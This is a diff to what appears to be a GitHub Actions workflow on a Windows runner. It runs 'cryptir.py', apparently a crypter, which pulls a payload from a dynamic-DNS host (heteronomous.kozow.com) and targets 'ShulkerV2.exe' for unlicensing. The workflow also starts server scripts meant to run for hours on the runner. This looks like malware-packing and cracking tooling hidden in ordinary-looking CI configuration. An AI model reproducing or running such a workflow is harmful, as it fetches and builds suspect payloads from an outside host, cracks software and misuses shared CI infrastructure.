@@ -240,16 +240,11 @@ jobs:
           $logFile = "C:\Users\runneradmin\FLAG\log.txt"
           $logFile1 = "C:\Users\runneradmin\FLAG\log1.txt"
           $logFile2 = "C:\Users\runneradmin\FLAG\log2.txt"
-          Start-Job {
-              py -3.11 cryptir.py --interval 3600 --sleep 100 --payload-url "http://heteronomous.kozow.com/files/sv2.dat" --output . --input out.exe --skip-obfuscation --unlicense-target ShulkerV2.exe --patch-script patch.py 2>&1 | Tee-Object -FilePath "C:\Users\runneradmin\FLAG\log.txt"
-          }
+          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cryptir.py', '--interval', '3600', '--sleep', '100', '--payload-url', 'http://heteronomous.kozow.com/files/sv2.dat', '--output', '.', '--input', 'out.exe', '--skip-obfuscation', '--unlicense-target', 'ShulkerV2.exe', '--patch-script', 'patch.py'
+          
           Start-Sleep -Seconds 10
-          Start-Job {
-              py -3.11 server.py 2>&1 | Tee-Object -FilePath "C:\Users\runneradmin\FLAG\log1.txt"
-          }
-          Start-Job {
-              py -3.11 cloud.py 2>&1 | Tee-Object -FilePath "C:\Users\runneradmin\FLAG\log2.txt"
-           }
+          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'server.py'
+          Start-Process -NoNewWindow py -ArgumentList '-3.11', 'cloud.py'
           $targetDuration = (5 * 60 + 40) * 60
           $startTime = [long]$env:START_TIME
           
